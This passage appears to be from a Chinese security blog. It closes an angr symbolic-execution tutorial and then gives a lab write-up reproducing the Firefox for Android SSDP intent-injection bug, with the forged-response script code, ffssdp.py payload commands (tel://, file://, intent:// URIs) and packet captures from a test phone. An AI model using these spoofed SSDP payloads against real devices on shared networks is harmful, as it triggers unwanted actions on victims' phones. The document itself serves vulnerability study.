0x1c&gt;In [11]: sm.active[0].regs.rspOut[11]: &lt;BV64 0x7fffffffffeff98&gt;//还有内存，比如我们加载elf的基址，加载4字节In [12]: sm.active[0].memory.load(0x400000,4)Out[12]: &lt;BV32 0x7f454c46&gt;In [13]: &quot;\\x7f\\x45\\x4c\\x46&quot;Out[13]: &#x27;\\x7fELF&#x27;\n\n现在来看执行，模拟程序\nIn [14]: sm.step()Out[14]: &lt;SimulationManager with 1 active&gt;In [15]: sm.step()Out[15]: &lt;SimulationManager with 1 active&gt;In [16]: sm.step()Out[16]: &lt;SimulationManager with 1 active&gt;In [17]: sm.step()Out[17]: &lt;SimulationManager with 1 active&gt;In [18]: sm.step()Out[18]: &lt;SimulationManager with 1 active&gt;\n\n我们可以看到之前的状态，它在执行过程中走过的路径\nIn [19]: list(sm.active[0].history.descriptions)Out[19]: [&#x27;&lt;IRSB from 0x401050: 1 sat&gt;&#x27;, &#x27;&lt;SimProcedure __libc_start_main from 0x527cc0: 1 sat&gt;&#x27;, &#x27;&lt;IRSB from 0x401136: 1 sat&gt;&#x27;, &#x27;&lt;IRSB from 0x401040: 1 sat&gt;&#x27;, &#x27;&lt;SimProcedure read from 0x5fea10: 1 sat&gt;&#x27;]\n\n继续尝试步进，这次使用函数来步进\n\n这条指令让符号执行开始运行，并在活动路径数量超过 1 时停止。换句话说，符号执行会继续探索路径，直到程序出现了多个可能的执行路径。这通常用于查找分支点或分析程序中不同输入条件引起的执行分歧。\n\nIn [20]: sm.run(until=lambda sm2 :len(sm.active) &gt;1)Out[20]: &lt;SimulationManager with 2 active&gt;\n\n来看看发生了什么，这是2者的执行路径，它们最后执行的都是 &#39;&lt;IRSB from 0x40115f: 2 sat&gt;&#39;]\nIn [21]: list(sm.active[0].history.descriptions)Out[21]: [&#x27;&lt;IRSB from 0x401050: 1 sat&gt;&#x27;, &#x27;&lt;SimProcedure __libc_start_main from 0x527cc0: 1 sat&gt;&#x27;, &#x27;&lt;IRSB from 0x401136: 1 sat&gt;&#x27;, &#x27;&lt;IRSB from 0x401040: 1 sat&gt;&#x27;, &#x27;&lt;SimProcedure read from 0x5fea10: 1 sat&gt;&#x27;, &#x27;&lt;IRSB from 0x40115f: 2 sat&gt;&#x27;]In [22]: list(sm.active[1].history.descriptions)Out[22]: [&#x27;&lt;IRSB from 0x401050: 1 sat&gt;&#x27;, &#x27;&lt;SimProcedure __libc_start_main from 0x527cc0: 1 sat&gt;&#x27;, &#x27;&lt;IRSB from 0x401136: 1 sat&gt;&#x27;, &#x27;&lt;IRSB from 0x401040: 1 sat&gt;&#x27;, &#x27;&lt;SimProcedure read from 0x5fea10: 1 sat&gt;&#x27;, &#x27;&lt;IRSB from 0x40115f: 2 sat&gt;&#x27;]\n\n查看产生分支的地方，这里就是cmp比较区域，也是一开始程序要点处\nIn [23]: p.factory.block(0x40115f).pp()40115f  movzx   eax, byte ptr [rbp-0x400]401166  cmp     al, 0x2a401168  jne     0x40117b\n\n可以来看这两个模拟器的状态，到底是产生了什么分歧。可以看到是“约束条件”\nIn [24]: sm.active[0].solver.constraintsOut[24]: [&lt;Bool packet_0_stdin_55_8 == 42&gt;]In [25]: sm.active[1].solver.constraintsOut[25]: [&lt;Bool packet_0_stdin_55_8 != 42&gt;]\n\n现在来看看“运行”会是怎样，成功运行并找到了分歧。但这是一个非常简单的程序，所以可以运行完并有结果。\nIn [26]: sm.run()Out[26]: &lt;SimulationManager with 2 deadended&gt;\n\n可以看一下现在的约束条件,还是42\n//注意，运行结束了，它们不再是activate，而是deadendedIn [27]: sm.active[1].solver.constraints---------------------------------------------------------------------------IndexError                                Traceback (most recent call last)Cell In[27], line 1----&gt; 1 sm.active[1].solver.constraintsIndexError: list index out of rangeIn [28]: sm.deadended[1].solver.constraintsOut[28]: [&lt;Bool packet_0_stdin_55_8 == 42&gt;]In [29]: sm.deadended[0].solver.constraintsOut[29]: [&lt;Bool packet_0_stdin_55_8 != 42&gt;]\n\n还可以看看他们的标准输出（可以称为“具体化”，具体化是查询约束求解器的过程）\nIn [30]: sm.deadended[0].posix.stdout.concretize()Out[30]: [b&#x27;Failure!&#x27;, b&#x27;\\n&#x27;]In [31]: sm.deadended[1].posix.stdout.concretize()Out[31]: [b&#x27;Success!&#x27;, b&#x27;\\n&#x27;]\n\n可以利用这个计算出标准输入\nIn [32]: sm.deadended[1].posix.stdin.concretize()Out[32]: [b&#x27;*&#x27;]\n\n一些问题看起来很完美，但是符号执行有严重的限制：它必须追踪每一条路径来理解正在发生的事情\n路径爆炸比如此代码\nunsigned long atoi(char *s) &#123;    unsigned long n = 0;    while (*s != &#x27;\\0&#x27;) &#123;        if (*s == &#x27;0&#x27;) n = n * 10;        else if (*s == &#x27;1&#x27;) n = n * 10 + 1;        else if (*s == &#x27;2&#x27;) n = n * 10 + 2;        else if (*s == &#x27;3&#x27;) n = n * 10 + 3;        else if (*s == &#x27;4&#x27;) n = n * 10 + 4;        else if (*s == &#x27;5&#x27;) n = n * 10 + 5;        else if (*s == &#x27;6&#x27;) n = n * 10 + 6;        else if (*s == &#x27;7&#x27;) n = n * 10 + 7;        else if (*s == &#x27;8&#x27;) n = n * 10 + 8;        else if (*s == &#x27;9&#x27;) n = n * 10 + 9;        else break;        s++;    &#125;    return n;&#125;int main() &#123;    char buffer[1024];    read(0, buffer, 10);     int i = atoi(buffer);     if (i == 42) &#123;        puts(&quot;Success!&quot;);    &#125; else &#123;        puts(&quot;Failure!&quot;);     &#125;    return 0; // 添加返回语句&#125;\n\n每个状态都会再分出10个不同的状态，最终会导致状态爆炸，这就是符号执行不可行的首要原因，它会遍历每一条路径，面对复杂流程的代码就先一步卡在了路径遍历上。\n现在执行此代码，来看到实时的状态爆炸\nIn [1]: import angrIn [2]: p=angr.Project(&quot;atoi&quot;)In [3]: sm=p.factory.simulation_manager()In [4]: sm.run(until=lamnda sm2 :len(sm.active)&gt;1)  Cell In[4], line 1    sm.run(until=lamnda sm2 :len(sm.active)&gt;1)                 ^SyntaxError: invalid syntax. Perhaps you forgot a comma?In [5]: sm.run(until=lambda sm2 :len(sm.active)&gt;1)Out[5]: &lt;SimulationManager with 2 active&gt;In [6]: sm.step()Out[6]: &lt;SimulationManager with 3 active&gt;In [7]: sm.step()Out[7]: &lt;SimulationManager with 4 active&gt;In [8]: sm.step()Out[8]: &lt;SimulationManager with 6 active&gt;In [9]: sm.step()Out[9]: &lt;SimulationManager with 9 active&gt;In [10]: sm.step()Out[10]: &lt;SimulationManager with 13 active&gt;In [11]: sm.step()Out[11]: &lt;SimulationManager with 19 active&gt;In [12]: sm.step()Out[12]: &lt;SimulationManager with 28 active&gt;In [13]: sm.step()Out[13]: &lt;SimulationManager with 41 active&gt;In [14]: sm.step()Out[14]: &lt;SimulationManager with 59 active, 1 deadended&gt;In [15]: sm.deadended[0].posix.stdin.concretizer()---------------------------------------------------------------------------AttributeError                            Traceback (most recent call last)Cell In[15], line 1----&gt; 1 sm.deadended[0].posix.stdin.concretizer()AttributeError: &#x27;SimPacketsStream&#x27; object has no attribute &#x27;concretizer&#x27;In [16]: sm.deadended[0].posix.stdin.concretize()Out[16]: [b&#x27;\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00&#x27;]\n\n这是第一个结束状态，得到的都是空字节，继续步进，会发现需要的时间越来愈长\nIn [17]: sm.step()Out[17]: &lt;SimulationManager with 87 active, 1 deadended&gt;In [18]: sm.step()Out[18]: &lt;SimulationManager with 128 active, 1 deadended&gt;In [19]: sm.step()Out[19]: &lt;SimulationManager with 186 active, 2 deadended&gt;In [20]: sm.deadended[0].posix.stdin.concretize()Out[20]: [b&#x27;\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00&#x27;]In [21]: sm.deadended[1].posix.stdin.concretize()Out[21]: [b&#x27;0\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00&#x27;]In [22]: sm.step()Out[22]: &lt;SimulationManager with 271 active, 3 deadended&gt;In [23]: sm.deadended[2].posix.stdin.concretize()Out[23]: [b&#x27;1\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00&#x27;]\n\n可以得到数字0，1，但这些离42还有很远,而且越到后面路径越多\n如何解决？可以使用一些技术合并状态，使用复杂的数学公式，将多种状态合并成一种\n但也有可能得到越来越复杂的数学公式\n约束一般使用 SMT解答器来解答，可满足性模块化理论\nSMT的基本思想是：理论本质上编码了不同类型的简化结果，将一些常见的情况套用那些化简，然后不断地用那些理论简化结果，用逻辑表达式构建一个模型，它表示实际涉及的比特，即使这些比特是未知的，然后通过布尔可满足性（SAT）原理解决问题，SAT是一个NP完全解决的问题https://en.wikipedia.org/wiki/Boolean_satisfiability_problem\n这意味着我们没有一个多项式时间的算法来解决这个问题，求解SAT模型的算法是指数型的，所以解决复杂的程序会很慢\n当面对复杂数据，复杂操作时，符号执行会失败，不只是路径爆炸的问题，也由于约束求解的局限性\n环境建模模拟CPU：相对简单\n模拟OS：难\n\n符号执行引擎必须识别各种内存错误（如缓冲区溢出、空指针解引用），这需要精确地跟踪内存块的边界、访问权限等信息。内存模拟中出现的错误检测约束，会进一步增加符号执行的复杂性。\n\n动态符号执行中需要模拟对指针、数组、结构体等复杂数据结构的访问。这些结构通常涉及多级指针和嵌套的内存引用，导致在执行过程中需要频繁地进行地址计算和内存对象查找。例如，访问链表、树等数据结构时，指针的符号化会导致路径爆炸，增加符号执行的开销。如何准确地追踪指针的指向并处理其符号化表达式，是内存模拟中的一大挑战\n\n在符号执行中，程序中的变量、地址、数组索引等都可能被符号化，从而表示为一组符号变量，而非具体值。这样一来，内存地址本身也可能是符号化的，这意味着一个内存访问操作（如读、写）可能对应多个潜在的内存位置。当使用符号化地址进行内存访问时，符号执行引擎必须考虑所有可能的地址，并在模拟内存时维护这些可能性。这极大地增加了内存访问的复杂性和计算成本\n\n动态符号执行在探索程序路径时，需要不断克隆内存状态，以探索不同的执行分支。每当程序执行一条条件分支指令，符号执行引擎就会创建两个新的状态，并且需要分别模拟它们的内存操作。这会导致大量的内存复制和状态克隆操作。\n\n符号执行引擎通常使用一种分层表示的方法来共享内存对象。然而，这种优化需要精确地管理哪些对象被共享，哪些对象需要克隆，且要确保在不同执行路径上的内存操作不会互相干扰\n\n\n参考资料pwn.college Module 12 - Automated Vulnerability Discovery - Dynamic Symbolic Execution\nhttps://www.diag.uniroma1.it/~delia/papers/svtr19.pdf\nhttps://srg.doc.ic.ac.uk/files/papers/ngmem-ase-2019.pdf\n"},{"title":"基于LAN的intent触发","url":"/2025/04/19/%E5%9F%BA%E4%BA%8ELAN%E7%9A%84intent%E8%A7%A6%E5%8F%91/","content":"漏洞简述Firefox for Android（68.11.0 及更低版本）会发送定期发送SSDP信息，在其解析LCATION时没有正确验证LOCATION字段的的信息，它错误地将 LOCATION 字段里的任何字符串（包括 intent:&#x2F;&#x2F; 这种非标准的 URI）直接传递给了 Android 系统的 Intent 处理机制。（打开 Web 浏览器的 URI 方案定义为 http 或 https。但是，Firefox 移动版中的原生 SSDP 代码会自行处理这些 URL，而不会将它们传递给 Intent 系统。）\n环境搭建低版本的Firefox for Android下载地址:https://archive.mozilla.org/pub/mobile/releases/68.11.0/测试脚本:https://initblog.com/images/post-firefox/ffssdp.py测试设备：安装了目标版本的pixel4，kali Linux 虚拟机（wireshark，python3)环境搭建：电脑和手机连接同一热点，使用wireshark进行抓包在此次测试中的ip地址：测试手机：192.168.165.49电脑物理机：192.168.165.247电脑虚拟机：192.168.165.40 \n注意事项：1.虚拟机使用桥接模式，ip addr查看当前网段是否正确。在物理主机ipconfig和测试手机ifconfig查看当前网络信息，确保网段一致\n2.使用wireshark抓包接口,比如现在就要抓包eth0处的流量\n─# ip addr1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00    inet 127.0.0.1/8 scope host lo       valid_lft forever preferred_lft forever    inet6 ::1/128 scope host noprefixroute        valid_lft forever preferred_lft forever2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP group default qlen 1000    link/ether 00:0c:29:0c:2d:ba brd ff:ff:ff:ff:ff:ff    inet 192.168.43.40/24 brd 192.168.43.255 scope global dynamic eth0       valid_lft 2280sec preferred_lft 2280sec    inet6 fe80::20c:29ff:fe0c:2dba/64 scope link        valid_lft forever preferred_lft forever\n\n3.不要使用测试手机开热点，手机作为NAT网关时，默认隔离客户端间通信（类似AP隔离模式），此时抓包，只能收到热点手机大量的MDNS流量，局域网内的其他设备流量是正常的\n漏洞分析SSDP简单服务发现协议**（ SSDP，Simple Service Discovery Protocol）是一种应用层协议，是构成通用即插即用(UPnP)技术的核心协议之一。用于在本地网络中自动发现设备和服务。它基于HTTPU（HTTP over UDP），通常使用UDP端口1900，多播地址239.255.255.250。M-SEARCH方法是SSDP协议中的一种请求类型，用于设备主动搜索特定类型的服务。在 SSDP 中，发起方将通过本地网络发送广播，询问有关任何可用服务的详细信息，例如第二屏幕设备或联网扬声器。任何系统都可以回复有关描述其特定服务的 XML 文件位置的详细信息。然后，发起方将自动转到该位置以解析 XML。它发出的包和响应包如下所示\nM-SEARCH * HTTP/1.1HOST: 239.255.255.250:1900MAN: &quot;ssdp:discover&quot;MX: 2ST: roku:ecpHTTP/1.1 200 OKCACHE-CONTROL: max-age=1800DATE: Sat, 19 Apr 2025 07:29:47 GMTEXT:LOCATION: http://example.com/device.xmlOPT: &quot;http://schemas.upnp.org/upnp/1/0/&quot;; ns=0101-NLS: uuid:6702957a-5614-1dc2-4c5a-df6ea40161e2SERVER: UPnP/1.0ST: roku:ecpUSN: uuid:6702957a-5614-1dc2-4c5a-df6ea40161e2::roku:ecpBOOTID.UPNP.ORG: 0CONFIGID.UPNP.ORG: 1\nSSDP 在 UDP 上使用两种形式的 HTTP：\n\nHTTPMU：基于多播 UDP 的 HTTP。这意味着请求通过 UDP 广播到整个网络。这用于客户端发现设备和服务器通告设备。\nHTTPU：基于单播 UDP 的 HTTP。这意味着请求通过 UDP 从一个主机直接发送到另一个主机。这用于响应搜索请求。LOCATION的值是一个URL，这个URL会指向一个xml文件，它遵循 UPnP 设备描述规范。它里面包含了关于设备的元数据和指向其他控制&#x2F;事件 URL 的信息。需要注意的是，漏洞源于 Firefox 浏览器对 SSDP 响应中 LOCATION 字段的解析逻辑，而非 SSDP 协议本身或 XML 文件的解析过程。\n\n脚本分析ffssdp.py来自作者之前编写的工具evil-ssdp它只能在linux中使用，因为它查找ip的途径是ifconfig\ndef get_ip(args):    &quot;&quot;&quot;    This function will attempt to automatically get the IP address of the    provided interface.    &quot;&quot;&quot;    ip_regex = r&#x27;inet (?:addr:)?(.*?) &#x27;    sys_ifconfig = os.popen(&#x27;ifconfig &#x27; + args.interface).read()    local_ip = re.findall(ip_regex, sys_ifconfig)    try:        return local_ip[0]    except IndexError:        print(PC.warn_box + &quot;Could not get network interface info. &quot;              &quot;Please check and try again.&quot;)        sys.exit()\n它不主动攻击，而是等待局域网中出现SSDP信息，然后对其进行回应核心部分伪造回应\ndef send_location(self, address, requested_st):        &quot;&quot;&quot;        This function replies back to clients letting them know where they can        access more information about our device. The keys here are the        &#x27;LOCATION&#x27; header and the &#x27;ST&#x27; header.        When a client receives this information back on the port they        initiated a discover from, they will go to that location to look for an        XML file.        &quot;&quot;&quot;        url = self.target        date_format = formatdate(timeval=None, localtime=False, usegmt=True)        ssdp_reply = (&#x27;HTTP/1.1 200 OK\\r\\n&#x27;                      &#x27;CACHE-CONTROL: max-age=1800\\r\\n&#x27;                      &#x27;DATE: &#123;&#125;\\r\\n&#x27;                      &#x27;EXT:\\r\\n&#x27;                      &#x27;LOCATION: &#123;&#125;\\r\\n&#x27;                      &#x27;OPT: &quot;http://schemas.upnp.org/upnp/1/0/&quot;; ns=01\\r\\n&#x27;                      &#x27;01-NLS: &#123;&#125;\\r\\n&#x27;                      &#x27;SERVER: UPnP/1.0\\r\\n&#x27;                      &#x27;ST: &#123;&#125;\\r\\n&#x27;                      &#x27;USN: &#123;&#125;::&#123;&#125;\\r\\n&#x27;                      &#x27;BOOTID.UPNP.ORG: 0\\r\\n&#x27;                      &#x27;CONFIGID.UPNP.ORG: 1\\r\\n&#x27;                      &#x27;\\r\\n\\r\\n&#x27;                      .format(date_format,                              url,                              self.session_usn,                              requested_st,                              self.session_usn,                              requested_st))        ssdp_reply = bytes(ssdp_reply, &#x27;utf-8&#x27;)        self.sock.sendto(ssdp_reply, address)\n总结攻击流程:\n\n被动监听: 脚本在指定的网络接口上监听发往 SSDP 多播地址 (239.255.255.250:1900) 的 UDP 包。    \n捕获请求: 当收到一个包含 “M-SEARCH” 和有效 ST: 头部的 UDP 包时，记录下发送方的 IP 和端口。    \n条件判断: 如果不是分析模式，并且 ST 格式基本正确。    \n构造响应: 创建一个虚假的 SSDP 200 OK 响应。    \n注入载荷: 将用户指定的恶意 Intent URI 放入响应的 LOCATION 头部。    \n定向回击: 将这个伪造的、包含恶意 LOCATION 的响应直接发送回发送 M-SEARCH 请求的设备 IP 和端口。    \n漏洞触发 (在目标设备上): 如果接收设备是运行着易受攻击 Firefox 的 Android 设备，Firefox 会错误处理这个响应，将 LOCATION 字段的恶意 URI 交给 Android Intent 系统执行，导致非预期的行为（如打开拨号器）。\n\n构建payload将-t后面替换成这里构造的语句就可以进行测试了\n拨号器Android 的核心应用程序之一 “拨号器” (Dialer) 在其 AndroidManifest.xml 中注册了一个 Intent Filter。这个 Intent Filter 声明它可以处理 ACTION_DIAL 或 ACTION_VIEW 类型的 Intent，并且其数据 (Data) 的 Scheme 是 tel。当你点击一个 tel:&#x2F;&#x2F;20250418 链接，或者某个应用（像这个漏洞中的 Firefox）将这个 URI 传递给系统时，Android 的 PackageManager 会查找哪个应用注册了能够处理 tel Scheme 的 Intent Filter。PackageManager 找到了拨号器应用，系统启动拨号器应用，并将 20250418 这个号码传递给它，拨号器就会显示这个号码，等待用户确认拨打。\n还有这样可以用于测试的scheme吗？\n\n标准化组织: 一些最常见的 Schemes（如 http, https, ftp, mailto）是由互联网工程任务组 (IETF) 通过 RFC 文档标准化的。    \n平台约定: 其他一些 Schemes（如 tel, sms, geo - 地理位置）虽然可能没有严格的全球标准，但在特定平台（如 Android、iOS）上被广泛支持和理解，成为了事实上的标准。操作系统或核心应用程序（如拨号器、短信应用）会注册自己来处理这些 Schemes。\n\n这里有一些例子，除了拨号器和文件，其他的我没有进行测试，仅供参考\nsms: 或 smsto:    - 触发应用: 默认的短信&#x2F;彩信应用。    - 作用: 打开短信编辑界面。    - 示例:        - sms:10086 (打开短信应用，收件人填好 10086)        - sms:10086?body&#x3D;Hello (打开短信应用，填好收件人和短信内容 “Hello”)        - smsto:10086 (功能类似，sms: 更常用) mailto:    - 触发应用: 默认的电子邮件客户端 (如 Gmail)。    - 作用: 打开邮件编辑界面。    - 示例:        - mailto:&#117;&#115;&#x65;&#114;&#x40;&#101;&#120;&#97;&#109;&#x70;&#108;&#101;&#x2e;&#99;&#x6f;&#109; (打开邮件应用，填好收件人)        - mailto:&#x75;&#115;&#x65;&#114;&#x40;&#x65;&#x78;&#x61;&#109;&#x70;&#108;&#101;&#46;&#x63;&#111;&#109;?subject&#x3D;Inquiry&amp;body&#x3D;Hi%20there (填好收件人、主题和正文，注意正文需要 URL 编码)        - mailto:?to&#x3D;&#117;&#115;&#101;&#114;&#49;&#64;&#x65;&#x78;&#97;&#109;&#x70;&#x6c;&#x65;&#46;&#x63;&#111;&#x6d;&amp;cc&#x3D;&#x75;&#115;&#x65;&#x72;&#x32;&#x40;&#101;&#x78;&#97;&#x6d;&#x70;&#x6c;&#101;&#x2e;&#x63;&#x6f;&#x6d; (指定收件人和抄送)http: 或 https:    - 触发应用: 默认的网络浏览器 (如 Chrome, Firefox)。    - 作用: 在浏览器中打开指定的网页。    - 示例:        - http://www.google.com      \ngeo:    - 触发应用: 默认的地图应用 (如 Google Maps)。    - 作用: 显示地理位置或进行地点搜索。    - 示例:        - geo:39.9042,116.4074 (显示北京的经纬度位置)        - geo:0,0?q&#x3D;Eiffel+Tower (搜索埃菲尔铁塔的位置)        - geo:0,0?q&#x3D;39.9042,116.4074(Beijing) (显示经纬度位置并添加标签 “Beijing”) market:    - 触发应用: Google Play Store 应用商店。    - 作用: 打开 Play Store 到指定的应用详情页、开发者页面或搜索结果。    - 示例:        - market:&#x2F;&#x2F;details?id&#x3D;com.google.android.apps.maps (打开 Google Maps 的应用详情页)        - market:&#x2F;&#x2F;search?q&#x3D;browser (在 Play Store 中搜索 “browser”)        - market:&#x2F;&#x2F;developer?id&#x3D;Google+LLC (打开 Google LLC 的开发者页面)\n file:    - 触发应用: 文件管理器应用（如果安装并注册了处理此 Scheme）。    - 作用: 尝试打开本地文件。    - 重要说明: 出于安全原因，Android 对 file:&#x2F;&#x2F; URI 的访问有严格限制。应用通常不能随意访问其他应用的私有文件或任意的本地文件路径。直接从浏览器或不可信来源触发 file:&#x2F;&#x2F; URI 通常会被阻止或功能受限。应用内部访问文件通常使用 content:&#x2F;&#x2F; URI (通过 ContentProvider) 或 Storage Access Framework。    - 示例 (可能受限): file:&#x2F;&#x2F;&#x2F;sdcard&#x2F;Download&#x2F;document.pdf\nAndroid intent URI具体来源：cs.android.com查找frameworks&#x2F;base&#x2F;core&#x2F;java&#x2F;android&#x2F;content&#x2F;Intent.java 文件，这里面有具体的原因，更详细在这里给出已经总结好的结构\nintent://host/path#Intent;    package=&lt;package_name&gt;;    scheme=&lt;scheme_type&gt;;    action=&lt;action_name&gt;;    category=&lt;category&gt;;    component=&lt;component_path&gt;;    S.&lt;extra_key&gt;=&lt;extra_value&gt;;    end\n解释\n\nintent:Scheme (协议头):这是整个 URI 的协议标识符。它告诉 Android 系统，这个 URI 不是一个普通的网页链接、文件路径或电话号码，而是一个需要被解析成 Android Intent 对象的特殊指令。\n#Intent;…;end:- Fragment (片段标识符): 这是 Intent URI 的核心部分，使用 # 号开始。它包含了一系列**键值对 (key&#x3D;value)**，用分号 (;) 分隔，用来描述 Intent 对象的各种属性（Action, Category, Package, Component, Extras 等）。Intent代表开始，end代表结束\n键值对属性 (在 #Intent; 和 ;end 之间):\npackage&#x3D;（可选）:指定唯一能够处理此 Intent 的应用程序包名。\nscheme&#x3D;(可选)：指定 Intent 的 data URI 部分应该使用的协议方案 (Scheme)。注意: 这与整个 URI 的 intent: scheme 不同。\n示例: scheme&#x3D;http, scheme&#x3D;tel, scheme&#x3D;geo。如果你在前面提供了 &#x2F;&#x2F;host&#x2F;path，这个 scheme 会被用来构成完整的 Data URI，例如 scheme&#x3D;http + &#x2F;&#x2F;example.com&#x2F; -&gt; Data 是 http://example.com/。\n\n\n-S. 前缀：传递附加数据（键值对）。\n\n\n\n漏洞验证检测ActivityManage日志它负责管理应用程序的生命周期（启动、暂停、停止）、管理 Activity 栈（用户看到的界面切换）、启动服务，以及最关键的——处理和分发 Intent\n安卓默认的URL拨号器└─# python3 ./ffssdp.py eth0 -t &quot;tel://20250419&quot;   _____  _____                 .____/ ____\\/ ____\\______ ______ __| _/_____\\   __\\\\   __\\/  ___//  ___// __ |\\____ \\ |  |   |  |  \\___ \\ \\___ \\/ /_/ ||  |_&gt; &gt; |__|   |__| /____  &gt;____  &gt;____ ||   __/                  \\/     \\/     \\/|__|...by initstring########################################[*] MSEARCH LISTENER:        eth0[*] INTENT:                  tel://20250419########################################[M-SEARCH]     New Host 192.168.165.49, Service Type: roku:ecp[M-SEARCH]     New Host 192.168.165.49, Service Type: media:router[M-SEARCH]     New Host 192.168.165.247, Service Type: urn:dial-multiscreen-org:service:dial:1\n系统响应并启动了拨号器\nflame:/ # logcat | grep ActivityManager04-19 11:42:04.980  1435  1690 I ActivityManager: Start proc 19569:com.google.android.dialer/u0a142 for activity &#123;com.google.android.dialer/com.android.dialer.main.impl.MainActivity&#125;\n\n这是其中一组相关流量信息\nM-SEARCH * HTTP/1.1HOST: 239.255.255.250:1900MAN: &quot;ssdp:discover&quot;MX: 2ST: roku:ecpHTTP/1.1 200 OKCACHE-CONTROL: max-age=1800DATE: Sat, 19 Apr 2025 03:42:02 GMTEXT:LOCATION: tel://20250419OPT: &quot;http://schemas.upnp.org/upnp/1/0/&quot;; ns=0101-NLS: uuid:f750933a-d123-c342-ae48-45d6a1f22c56SERVER: UPnP/1.0ST: roku:ecpUSN: uuid:f750933a-d123-c342-ae48-45d6a1f22c56::roku:ecpBOOTID.UPNP.ORG: 0CONFIGID.UPNP.ORG: 1\n\n\n文件└─# python3 ./ffssdp.py eth0 -t &quot;file://storage/emulated/0/Download/access.log&quot;\nfirefox无事发生\n\nAndroid系统上使用file:&#x2F;&#x2F;协议的限制。Android的WebView和浏览器出于安全考虑，通常不允许通过file:&#x2F;&#x2F;协议访问本地文件所以无法访问\n各浏览器策略对比\n\n\n\n浏览器\nfile:// 支持情况\n安全策略\n\n\n\nFirefox\n默认禁用，需 about:config 调整\n设置 security.fileuri.strict_origin_policy 为 false 可部分启用\n\n\nChrome\n完全禁止\n控制台显示 Not allowed to load local resource\n\n\nSamsung Internet\n允许访问 /sdcard/ 子目录\n需手动授权文件夹访问权限\n\n\nVia Browser\n支持自定义本地文件访问\n内置文件管理器导航\n\n\n构建应用关联的Android Intent URL首先是和firefox相关联的url└─# python3 ./ffssdp.py eth0 -t &quot;intent://example.com/#Intent;scheme=http;package=org.mozilla.firefox;end&quot;\n流量信息\nM-SEARCH * HTTP/1.1HOST: 239.255.255.250:1900MAN: &quot;ssdp:discover&quot;MX: 2ST: roku:ecpHTTP/1.1 200 OKCACHE-CONTROL: max-age=1800DATE: Sat, 19 Apr 2025 08:40:23 GMTEXT:LOCATION: intent://example.com/#Intent;scheme=http;package=org.mozilla.firefox;endOPT: &quot;http://schemas.upnp.org/upnp/1/0/&quot;; ns=0101-NLS: uuid:076edbd0-e133-9a30-879a-3c62235bba08SERVER: UPnP/1.0ST: roku:ecpUSN: uuid:076edbd0-e133-9a30-879a-3c62235bba08::roku:ecpBOOTID.UPNP.ORG: 0CONFIGID.UPNP.ORG: 1\n结果\n然后是尝试触发chrome└─# python3 ./ffssdp.py eth0 -t &quot;intent://example.com/#Intent;scheme=http;package=com.android.chrome;end&quot;\n流量信息\nHTTP/1.1 200 OKCACHE-CONTROL: max-age=1800DATE: Sat, 19 Apr 2025 08:45:50 GMTEXT:LOCATION: intent://example.com/#Intent;scheme=http;package=com.android.chrome;endOPT: &quot;http://schemas.upnp.org/upnp/1/0/&quot;; ns=0101-NLS: uuid:905594bc-7745-19ec-d5dd-ca9f47a60b7eSERVER: UPnP/1.0ST: urn:dial-multiscreen-org:service:dial:1USN: uuid:905594bc-7745-19ec-d5dd-ca9f47a60b7e::urn:dial-multiscreen-org:service:dial:1BOOTID.UPNP.ORG: 0CONFIGID.UPNP.ORG: 1\n\n结果当然了firefox必须是在启动状态的，不然无法触发\n检测http然后检测http头的信息”打开 Web 浏览器的 URI 方案定义为 http 或 https。但是，Firefox 移动版中的原生 SSDP 代码会自行处理这些 URL，而不会将它们传递给 Intent 系统。“现在就是检测，当出现http://ip.xml时是不是由firefox进行处理这里进行了两次测试\n直接访问example.com运行\n└─# python3 ./ffssdp.py eth0 -t &quot;http://example.com&quot; \n\n信息成功传递\nM-SEARCH * HTTP/1.1HOST: 239.255.255.250:1900MAN: &quot;ssdp:discover&quot;MX: 2ST: roku:ecpHTTP/1.1 200 OKCACHE-CONTROL: max-age=1800DATE: Sat, 19 Apr 2025 06:31:21 GMTEXT:LOCATION: http://example.comOPT: &quot;http://schemas.upnp.org/upnp/1/0/&quot;; ns=0101-NLS: uuid:7b9ef4eb-c8f4-e710-cff9-cd13c3f33f82SERVER: UPnP/1.0ST: roku:ecpUSN: uuid:7b9ef4eb-c8f4-e710-cff9-cd13c3f33f82::roku:ecpBOOTID.UPNP.ORG: 0CONFIGID.UPNP.ORG: 1\n但是firefox无事发生\n访问http://example.com/device.xml指令\n└─# python3 ./ffssdp.py eth0 -t &quot;http://example.com/device.xml&quot; \npcap\nM-SEARCH * HTTP/1.1HOST: 239.255.255.250:1900MAN: &quot;ssdp:discover&quot;MX: 2ST: roku:ecpHTTP/1.1 200 OKCACHE-CONTROL: max-age=1800DATE: Sat, 19 Apr 2025 07:29:47 GMTEXT:LOCATION: http://example.com/device.xmlOPT: &quot;http://schemas.upnp.org/upnp/1/0/&quot;; ns=0101-NLS: uuid:6702957a-5614-1dc2-4c5a-df6ea40161e2SERVER: UPnP/1.0ST: roku:ecpUSN: uuid:6702957a-5614-1dc2-4c5a-df6ea40161e2::roku:ecpBOOTID.UPNP.ORG: 0CONFIGID.UPNP.ORG: 1\nfirefox无事发生\n部署http服务设备这一步是为了检测，是不是由firefox启动的intent。自己部署服务器就能更好的看到日志信息。1.在termux安装python\npkg install python\n2.创建updp文件\nmkdir ./upnp-server &amp;&amp; cd ./upnp-servernano device.xml\ndevice.xml\n&lt;root xmlns=&quot;urn:schemas-upnp-org:device-1-0&quot;&gt;  &lt;specVersion&gt;    &lt;major&gt;1&lt;/major&gt;    &lt;minor&gt;0&lt;/minor&gt;  &lt;/specVersion&gt;  &lt;device&gt;    &lt;deviceType&gt;urn:roku.com:device:ecp:1&lt;/deviceType&gt;    &lt;friendlyName&gt;My Fake Roku&lt;/friendlyName&gt;    &lt;manufacturer&gt;Test Corp&lt;/manufacturer&gt;    &lt;modelName&gt;UPnP Test Device&lt;/modelName&gt;    &lt;UDN&gt;uuid:7b9ef4eb-c8f4-e710-cff9-cd13c3f33f82&lt;/UDN&gt;    &lt;serviceList&gt;      &lt;service&gt;        